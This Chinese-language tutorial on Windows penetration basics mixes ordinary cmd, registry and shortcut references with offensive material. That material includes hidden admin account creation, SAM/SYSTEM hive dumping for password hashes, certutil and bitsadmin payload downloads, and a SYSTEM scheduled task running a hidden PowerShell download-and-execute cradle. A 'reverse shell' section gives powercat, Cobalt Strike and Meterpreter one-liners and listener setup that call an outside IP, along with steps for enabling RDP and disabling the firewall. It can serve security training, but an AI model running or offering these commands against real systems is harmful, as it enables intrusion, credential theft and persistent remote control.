> 原文链接: https://www.anquanke.com//post/id/236522 


# Windows渗透基础大全


                                阅读量   
                                **544077**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



## [![](https://p4.ssl.qhimg.com/t01ee93705256596839.jpg)](https://p4.ssl.qhimg.com/t01ee93705256596839.jpg)



## Windows发展历史

[Microsoft Windows](https://baike.baidu.com/item/Microsoft%20Windows),是美国微软公司研发的一套操作系统，它问世于1985年，起初仅仅是DOS模拟环境，后续的系统版本由于微软不断的更新升级，不但易用，也慢慢的成为家家户户人们最喜爱的操作系统。

**MS-Dos**

<tr class="md-end-block" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-top: 1px solid #dfe2e5; margin: 0px; padding: 0px;"><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">版本号</th><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">发布时间</th></tr>|------

**WIN 9X**

<tr class="md-end-block" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-top: 1px solid #dfe2e5; margin: 0px; padding: 0px;"><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">版本号</th><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">发布时间</th></tr>|------

**WIN NT**

<tr class="md-end-block" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-top: 1px solid #dfe2e5; margin: 0px; padding: 0px;"><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">版本号</th><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">发布时间</th></tr>|------

**Windows Server**

<tr class="md-end-block" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-top: 1px solid #dfe2e5; margin: 0px; padding: 0px;"><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">版本号</th><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">发布时间</th></tr>|------

## Windows中常见的目录

```
C:\Users\xie\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup   这个目录下存放着这个用户开机启动的程序
C:\programData\Microsoft\Winodws\Start Menu\Programs\StartUp   这个目录下存放这开机自启的程序
C:\Windows                                 这个目录是系统的安装目录
C:\Windows\System32                       这个目录下存放着系统的配置文件
C:\Windows\System32\config\SAM             这个目录下的SAM文件存放着用户的登录账户和密码，要清楚账户和密码，需要进PE系统把这个文件删掉，对应系统进程： lsass.exe
C:\PerfLogs                               这个是系统日志目录
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)

## Windows常见的cmd命令

```
#系统信息
CHCP 65001                           修改字体编码为UTF-8
systeminfo                           查看系统信息
hostname                             查看主机名
SET                                 查看环境变量
color                               改变cmd颜色
cls                                 清除屏幕
set                                 查看环境变量
set path                             查看指定环境变量
​
#网络
ping -t  -l  65500  ip               死亡之ping
ipconfig    /release                 释放ip
ipconfig    /renew                   重新获得ip
ipconfig    /flushdns               刷新DNS缓存
route print                         打印路由信息
arp -a                               查看arp缓存
net view                             查看局域网内其他计算机名称
netsh firewall show state           防火墙状态
netsh firewall show config           防火墙规则
​
​
#用户
whoami                               查看系统当前用户
net user                             查看有哪些用户
net user xie                         查看用户xie的信息
net localgroup                       查看组
net localgroup administrators         查看组administrators的信息
net user  hack   123  /add           新建一个用户hack，密码为123
net user  hack$  123  /add           新建一个隐藏hack用户，密码为123
net user  hack   /del                 删除用户hack
net localgroup  administrators  hack  /add   将普通用户hack提权到管理员
net user  guest  /active:yes         激活guest用户
net user  guest  /active:no           关闭guest用户
net password   密码                   更改系统当前登录用户密码
net user guest 密码                   更改guest用户密码
​
​
#端口进程服务
tasklist                             查看进程
tasklist  /v                         查看进程，显示进程使用者名称
netstat  -ano                       查看系统开放端口
netstat  -ano|findstr 80             查看80端口对应的PID
tasklist | findstr 80               查看80端口对应的进程
taskkill /f /t /im xx.exe           杀死xx.exe进程
taskkill /F -pid 520                 杀死pid为520的进程
net start                           查看开启了哪些服务
net start telnet                     开启telnet服务
net stop  telnet                     停止 telnet服务
start   www.baidu.com               打开网址
​
#共享
net use                               查看连接
net share                             查看本地开启的共享
net share ipc$                       开启ipc$共享
net share ipc$ /del                   删除ipc$共享
net share c$ /del                     删除C盘共享
​
net use \\192.168.10.15\ipc$ /u:"" ""     与192.168.10.15建立ipc空连接
net use \\192.168.10.15      /u:"" ""     与192.168.10.15建立ipc空连接，可以吧ipc$去掉
net use \\192.168.10.15 /u:"administrator" "root"   以administrator身份与192.168.10.15建立ipc连接
net use \\192.168.10.15 /del             删除ipc连接
​
net use \\192.168.10.15\c$  /u:"administrator" "root"   建立C盘共享
dir \\192.168.10.15\c$                 查看192.168.10.15C盘文件
dir \\192.168.10.15\c$\user             查看192.168.10.15C盘文件下的user目录
dir \\192.168.10.15\c$\user\test.exe   查看192.168.10.15C盘文件下的user目录下的test.exe文件
net use \\192.168.10.15\c$  /del       删除该C盘共享连接
​
net use k: \\192.168.10.15\c$  /u:"administrator" "root"   将目标C盘映射到本地K盘
net use k: /del                                             删除该映射
  
#文件操作 
echo  hello,word &gt; 1.txt             向1.txt中写入 hello,word
echo  hello,word &gt;&gt;1.txt             向1.txt中追加 hello,word
del                                   删除一个文件
deltree                               删除文件夹和它下面的所有子文件夹还有文件
ren 1.txt  2.txt                     将 1.txt 重命名为 2.txt
type  1.txt                           查看1.txt文件的内容
md                                   创建一个文件夹
rd                                   删除一个文件夹
move  1.txt  d:/                     将1.txt文件移动到d盘下
type  123.txt                         打开123.txt文件
dir c:\                               查看C盘下的文件
dir c:\ /A                           查看C盘下的所有文件，包括隐藏文件
dir c:\ /S                           查看C盘下和其子文件夹下的文件
dir c:\ /B                           只显示C盘下的文件名
​
shutdown -s -t 60 -c “你的电脑被黑了”         -s关机 -r重启 -a取消
copy con A.txt   创建A.txt文本文件; 
 hello,word　　　　　 输入内容; 
　　　 按CTRL+Z键，之后再回车；
​
​

reg save  hklm\sam  sam.hive
reg save  hklm\system  system.hive
这两个文件是windows的用户账户数据库，所有用户的登录名以及口令等相关信息都会保存在文件中，这两条命令是获取windows管理员的hash值
```



## Windows中cmd窗口的文件下载(bitsadmin、certutil、iwr)

无论是bitsadmin还是certutil，都要将下载的文件放到拥有权限的目录，否则会提示权限拒绝

### certutil

certutil也是windows下一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。

```
certutil -urlcache -split -f http://114.118.80.138/shell.php  #下载文件到当前目录下
​
certutil -urlcache -split -f http://114.118.80.138/shell.php  c:/users/xie/desktop/shell.php        #下载文件到指定目录下
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d552933b88da23c6.png)

但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令

[![](https://p3.ssl.qhimg.com/t013b41d5d1d83d0033.png)](https://p3.ssl.qhimg.com/t013b41d5d1d83d0033.png)

### bitsadmin

bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。

**bitsadmin的一些特性：**

**·** bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。

**·** bitsadmin 可以跟随URL跳转.

**·** bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。

用法：

```
bitsadmin /transfer test http://files.cnblogs.com/files/gayhub/bcn.js  c:\users\xie\desktop\shell.php
# "任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0138c82e80dc25cc82.png)

下载完成后

[![](https://p1.ssl.qhimg.com/t014c485e5a5f51321f.png)](https://p1.ssl.qhimg.com/t014c485e5a5f51321f.png)

默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速，以下是用法示例

```
start bitsadmin /transfer test http://192.168.10.14/test.exe  f:\test.exe
bitsadmin /setpriority test foreground     #设置任务test为最高优先级
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b88f93b2bfa90cb6.png)

相关文章：[使用bitsadmin.exe 下载文件,配合bcn.bat玩出更多的花样](https://www.cnblogs.com/gayhub/p/6517655.html)

### iwr

iwr是PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令，但是这会被安全软件检测到。所以建议在执行前，先进入powershell下

```
iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012b523c0976b07123.png)

[![](https://p4.ssl.qhimg.com/t01ae6f220f015364f6.png)](https://p4.ssl.qhimg.com/t01ae6f220f015364f6.png)



## Windows中的计划任务(schtasks)

schtasks是windows下计划任务的命令，可以设置在指定时间执行指定程序或脚本。

```
在目标主机上创建一个名为test的计划任务，启动程序为C:\vps.exe，启动权限为system,启动时间为每小时
schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f

schtasks /create /tn test /sc onstart/onlogon/HOURLY /mo 1 /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://xx.xx.xx.xx'''))'" /ru system /f

查询该test计划任务
schtasks /query | findstr test

启动该test计划任务
schtasks /run /i /tn "test"

删除该test计划任务
schtasks /delete /tn "test" /f</code>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)</pre>
参数： /tn：指定计划任务的名称
/sc：指定啥时候开始
**· ** /sc onstart 系统启动的时候执行该计划任务
**· ** /sc onlogon 用户登录的时候执行该计划任务
**· ** /sc onidle -i 30 在空闲模式每隔30分钟执行该计划任务
**· ** /sc hourly 每隔一小时执行该计划任务
**· ** /sc minute 每隔一分钟执行该计划任务
/ed ：指定啥时候停止该计划任务，可以使用该参数，则该计划任务将一直执行下去。也可以指定具体的时间：
**· ** /ed 01/10/2020 -ET 20:00
/tr：指定运行的程序或脚本
/ru：以什么权限运行，可以是 system 或 %USERNAME%
 
<h2 name="h2-9" id="h2-9">Windows中加载并执行PowerShell脚本 </h2>
Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 [.NET Framework](https://baike.baidu.com/item/.NET%20Framework)的强大功能。
Windows XP 和 Windows Server 2003是没有Powershell的，Win7、2008 Server 及其以后的有。更多的关于PowerShell的用法：[PowerShell使用浅析](https://blog.csdn.net/qq_36119192/article/details/103021617)
<h3 name="h3-10" id="h3-10">本地加载并执行PowerShell脚本</h3>
在cmd当前目录下有PowerView.ps1脚本，并执行其中的Get-Netdomain模块
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" style="box-sizing: border-box; overflow: visible; font-family: var(--monospace); font-size: 0.9em; break-inside: avoid; white-space: normal; background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; border-color: #e7eaed; border-radius: 3px; padding: 8px 4px 6px; margin-bottom: 15px; margin-top: 15px; width: inherit; position: relative !important;" spellcheck="false">powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain  </pre>
[![](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)[![](https://p1.ssl.qhimg.com/t018593559c28a6fb6e.png)](https://p1.ssl.qhimg.com/t018593559c28a6fb6e.png)
<h3 name="h3-11" id="h3-11">远程下载并执行PowerShell脚本</h3>
远程下载并执行test.ps1脚本、远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块
<pre class="pure-highlightjs"><code class="hljs javascript">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/test.ps1')
powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/powerview.ps1');import-module .\powerview.ps1;Get-NetDomain
```

### 远程下载并执行PowerShell脚本

[![](https://p4.ssl.qhimg.com/t01009dc2487184e3dc.png)](https://p4.ssl.qhimg.com/t01009dc2487184e3dc.png)



## Windows中的批处理文件

```
@echo off           表示在此语句后所有运行的命令都不显示命令行本身
echo                 显示这行后面的文字
title               标题 
rem                 注释命令
cls                 清楚窗口
set /a               赋值
set /p  name=       接受用户输入,保存在name中
%name%               输出用户的输入
if   else           判断
FOR /F %%i in (ip.txt) do echo %%i       #循环打印出ip.txt内的数据，同一个窗口
FOR /F %%i in (ip.txt) do start echo %%i       #循环打印出ip.txt内的数据，不同窗口
GEQ                 大于等于
LSS                 小于
goto   :1 :2         跳转到
exit                 退出程序
start               启动文件
call                 调用另一个批处理文件
dir c:\*.*&gt;a.txt     将C盘文件列表写入a.txt
del                 删除一个或多个文件
```

## Windows中快捷键操作

```
Alt+Tab               快速切换程序
Alt+F4               快速关闭程序
Alt                   矩形选择
Alt+双击文件           查看文件属性
Shift+delete         永久删除文件
Ctrl+。               中英文标点切换
Ctrl+S               保存
Ctrl+N               新建
Ctrl+W               关闭程序
Ctrl+U               加下划线
Ctrl+Z               撤销操作
Ctrl+B               粗体
Ctrl+I               斜体
Ctrl+shift+esc       快速打开任务管理器
Win+D                 快速回到桌面
Win+I                 快速打开设置
Win+A                 打开操作中心
Win+Q                 打开语音助手cortana
Win+X                 打开windows功能
Win+Pause             我的电脑的属性
```

## Windows中运行窗口的命令

```
dxdiag               查询电脑硬件配置信息
control               控制面板
services.msc         服务
msconfig             系统配置
regedit               注册表
ncpa.cpl             网络连接
firewall.cpl         防火墙
devmgmt.msc           设备管理器 
diskmgmt.msc         磁盘管理实用
compmgmt.msc         计算机管理
winver               检查Windows版本  
write                 写字板
mspaint               画图板
mstsc                 远程桌面连接 
magnify               放大镜实用程序 
notepad               打开记事本
shrpubw               创建共享文件夹 
calc                 启动计算器 
osk                   打开屏幕键盘
```

## Windows中的注册表

注册表（Registry，繁体中文版Windows称之为登录）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的配置信息

**· ** HKEY_CLASSES_ROOT 管理文件系统，根据windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开文件所要调用的程序等等信息。

**· ** HEKY_CURRENT_USER 管理系统当前的用户信息。在这个根键中保存了本地计算机存放的当前登录的用户信息，包括用户登录用户名和暂存的密码。

**· ** HKEY_LOCAL_MACHINE 管理当前系统硬件配置。在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息，或者在远程计算机中可访问的一组键中

**· ** HKEY_USERS 管理系统的用户信息，在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。

**· ** HKEY_CURRENT_CONFIG 管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置的数据，该用户使用过的文档列表。

### 使用reg保存注册表中的sam、system、security文件

以下命令需要管理员权限执行

```
reg save hklm\sam c:\users\mi\desktop\sam
reg save hklm\system c:\users\mi\desktop\system
reg save hklm\security c:\users\mi\desktop\security
```

## [![](https://p5.ssl.qhimg.com/t016e31eb1faabd012f.png)](https://p5.ssl.qhimg.com/t016e31eb1faabd012f.png)



## Windows中的端口

**· ** 公认端口：公认端口也称为常用端口，包括 **0-1023** 端口

**· ** 注册端口：注册端口包括 **1024-49151** 端口，它们松散地绑定一些服务

**· ** 动态/私有端口：动态/私有端口包括 **49152-65535**，这些端口通常不会被分配服务。

**关闭端口：**

命令行方式关闭端口，实际上是调用了防火墙。以管理员权限打开cmd窗口，执行下面命令，以下是演示关闭139端口

```
netsh advfirewall set allprofile state on
netsh advfirewall firewall add rule name=test dir=in action=block protocol=TCP localport=139   #想关闭其他端口，把139替换成其他端口就行
```

[![](https://p3.ssl.qhimg.com/t01543f80a113ea41f5.png)](https://p3.ssl.qhimg.com/t01543f80a113ea41f5.png)

**也可以直接在防火墙图形化界面关闭：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f982b956465430c9.png)[![](https://p0.ssl.qhimg.com/t01fca9b2388a189ebb.png)](https://p0.ssl.qhimg.com/t01fca9b2388a189ebb.png)[![](https://p2.ssl.qhimg.com/t01281f32a989cfaaf4.png)](https://p2.ssl.qhimg.com/t01281f32a989cfaaf4.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015d8d1f702816c2ad.png)[![](https://p3.ssl.qhimg.com/t01028b423c1b45397c.png)](https://p3.ssl.qhimg.com/t01028b423c1b45397c.png)

然后一直下一步就可以了

[![](https://p2.ssl.qhimg.com/t0158bb47c680a1646a.png)](https://p2.ssl.qhimg.com/t0158bb47c680a1646a.png)



## Windows中的进程

windows中包括系统进程和程序进程。

ctrl+shift+esc 打开任务管理器，可以查看进程信息。用户名为SYSTEM的是系统进程。

[![](https://p5.ssl.qhimg.com/t01ad1eb9267ccd60c4.png)](https://p5.ssl.qhimg.com/t01ad1eb9267ccd60c4.png)[![](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)

**一些常见的系统进程和含义：**

**· ** conime.exe：与输入法编辑器有关的系统进程，能够确保正常调整和编辑系统中的输入法

**· ** csrss.exe：该进程是微软客户端/服务端运行时子系统，该进行管理windows图形相关任务

**· ** ctfmon.exe：该进程与输入法有关，该进程的正常运行能够确保语言栏能正常显示在任务栏中

**· ** explorer.exe：该进程是windows资源管理器，可以说是windows图形界面外壳程序，该进程的正常运行能够确保在桌面上显示桌面图标和任务栏

**· ** lsass.exe：该进行用于windows操作系统的安全机制、本地安全和登录策略

**· ** services.exe：该进程用于启动和停止系统中的服务，如果用户手动终止该进程，系统也会重新启动该进程

**· ** smss.exe：该进程用于调用对话管理子系统，负责用户与操作系统的对话

**· ** svchost.exe：该进行是从动态链接库(DLL)中运行的服务的通用主机进程名称，如果用户手动终止该进程，系统也会重新启动该进程

**· ** system：该进程是windows页面内存管理进程，它能够确保系统的正常启动

**· ** system idle process：该进行的功能是在CPU空闲时发出一个命令，使CPU挂起，从而有效降低CPU内核的温度

**· ** winlogon.exe：该进程是Windows NT用户登录程序，主要用于管理用户登录和退出。

### 常见杀毒软件进程

<tr class="md-end-block" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-top: 1px solid #dfe2e5; margin: 0px; padding: 0px;"><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">进程</th><th style="box-sizing: border-box; padding: 6px 13px; border-width: 1px 1px 0px; border-image: initial; margin: 0px; border-color: #dfe2e5 #dfe2e5 initial #dfe2e5; border-style: solid solid initial solid;">软件名称</th></tr>|------



## 监听端口netstat

windows中使用 netstat 命令用来监听端口

**· ** 显示所有的有效连接信息列表，包括监听连接请求（LISTENING ）的连接、已建立的连接（ESTABLISHED ）、断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等 ：netstat -a

**· ** 以数字形式显示地址和端口号：netstst -an

**· ** 除了显示这些信息外，还显示进程的PID：netstat -ano

**· ** 查看被占用端口80对应的应用的PID：netstat -ano | findstr 80

**· ** 查看80端口被哪个进程或程序占用：tasklist | findstr 80

**· ** 结束该进程或程序：taskkill /f /t /im xx.exe /f 杀死所有进程及 /t 强制杀死 /im 用镜像名称作为进程信息 

**· ** 杀死指定PID的进程：taskkill -F -pid 520 杀死PID为520的进程



## Windows反弹Shell

**cmd窗口下利用Powershell反弹NC shell**

亲测所有机器都适用

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
​
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd.exe"
```

[![](https://p2.ssl.qhimg.com/t0130a00894642619fc.png)](https://p2.ssl.qhimg.com/t0130a00894642619fc.png)[![](https://p0.ssl.qhimg.com/t012a50a651f1877cc6.png)](https://p0.ssl.qhimg.com/t012a50a651f1877cc6.png)

[![](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)

**cmd窗口下利用Powershell反弹CobaltStrike shell**

windows10 经常性不能用。windows 2008R2以下百分百适用。

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://114.118.80.138:8080/a'))"   #后台运行

powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://114.118.80.138:8080/a'))"
```

**cmd窗口下反弹MSF shell**

**VPS上的操作**

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=114.128.90.138 lport=7788 -f psh-reflection &gt;7788.ps1        #生成木马文件 7788.ps1
​
python -m SimpleHTTPServer 80  #开启web服务
​
#MSF监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 114.118.80.138
set lport 7788
exploit -j
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01214ac445a6e8b8e5.png)[![](https://p2.ssl.qhimg.com/t011a75008f44be4743.png)](https://p2.ssl.qhimg.com/t011a75008f44be4743.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01db4e16dd59dcd8d3.png)



**目标机的操作**

```
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://114.118.80.138/7788.ps1');xx.ps1"  #后台运行
​
或者
​
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://114.118.80.138/7788.ps1');xx.ps1"
```

[![](https://p3.ssl.qhimg.com/t011ca00f0b70478398.png)](https://p3.ssl.qhimg.com/t011ca00f0b70478398.png)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01741f84b140b5a81c.png)



## 一键开启3389远程桌面

先查询RDP的端口

```
tasklist /svc | findstr TermService
netstat -ano | findstr 上一步查询到的PID
```

以下命令需要administrator权限运行

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
​
如果还是不能连接的话，则是防火墙的问题了。需要关闭防火墙，或者开启防火墙运行3389端口
关闭防火墙：
   netsh firewall get opmode disable (WIN2003之前)
   netsh advfirewall set allprofiles state off (WIN2003之后)
防火墙允许3389端口：
   netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

[![](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)

## 防火墙操作

```
查看防火墙配置： netsh firewall show config
设置防火墙日志存储位置：netsh advfirewall set currentprofile logging filename "C:\Windows\temp\FirewallLOG.log"
关闭防火墙：
  netsh firewall get opmode disable (WIN2003之前)
  netsh advfirewall set allprofiles state off (WIN2003之后)
允许某个程序的全连接
  netsh firewall add allowdprogram C:\nc.exe "allow nc" enable   (WIN2003之前)
​
允许某个程序连入
  netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"
​
允许某个程序外连
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"
​
开启3389端口
  netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012eb09f21483b324d.gif)

## Windows应急响应

[Windows应急响应](https://wh0ale.github.io/2019/03/01/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/)

[分享一次应急响应简述](https://www.freebuf.com/articles/system/214353.html)

[RDP登录日志取证和清除](https://mp.weixin.qq.com/s/3RcXeK2X_9S-XFoaVomzIg)

[https://bugs.hacking8.com/tiquan/?m=cmd](https://bugs.hacking8.com/tiquan/?m=cmd))



如果你想和我一起讨论的话，那就加入我的知识星球吧！

[![](https://p1.ssl.qhimg.com/t01e6342801b4fb3670.png)](https://p1.ssl.qhimg.com/t01e6342801b4fb3670.png)
